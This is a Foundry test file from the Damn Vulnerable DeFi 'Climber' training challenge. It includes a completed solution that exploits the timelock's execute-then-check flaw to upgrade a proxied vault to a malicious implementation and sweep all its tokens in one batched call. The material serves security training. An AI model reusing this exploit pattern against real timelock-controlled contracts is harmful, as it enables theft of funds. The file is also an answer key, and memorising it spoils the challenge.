// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberVaultMalicious} from "../../src/climber/ClimberVaultMalicious.sol";
import {ScheduleHelper} from  "../../src/climber/ScheduleHelper.sol"; 
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        
        // Deploy new implementation
        ClimberVaultMalicious newImpl = new ClimberVaultMalicious();
        // Deploy helper to set execution data
        ScheduleHelper helper = new ScheduleHelper(address(timelock));

        // Define empty placeholders to be populated later
        address[] memory _targets = new address[](5);
        uint256[] memory _values = new uint256[](5);
        bytes[] memory _dataElements = new bytes[](5);
        bytes32 salt = "0123";

        // Upgrade the proxy with new implementation where sweepFunds can be called by anyone
        _targets[0] = address(vault);
        _values[0] = 0;
        _dataElements[0] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, newImpl, "");

        // Sweep the funds to the recovery address
        _targets[1] = address(vault);
        _values[1] = 0;
        _dataElements[1] = abi.encodeWithSelector(ClimberVaultMalicious.sweepFunds.selector, address(token), recovery);

        // Grant the helper contract which will invoke `schedule` with the PROPOSER_ROLE
        _targets[2] = address(timelock);
        _values[2] = 0;
        _dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(helper));

        // Update the delay to 0 seconds
        _targets[3] = address(timelock);
        _values[3] = 0;
        _dataElements[3] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // Invoke `schedule` via the helper contract
        _targets[4] = address(helper);
        _values[4] = 0;
        _dataElements[4] = abi.encodeWithSelector(ScheduleHelper.schedule.selector);

        // Set the data in the helper contract
        helper.setData(_targets, _values, _dataElements, salt);

        // Execute the operation
        timelock.execute(_targets, _values, _dataElements, salt);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
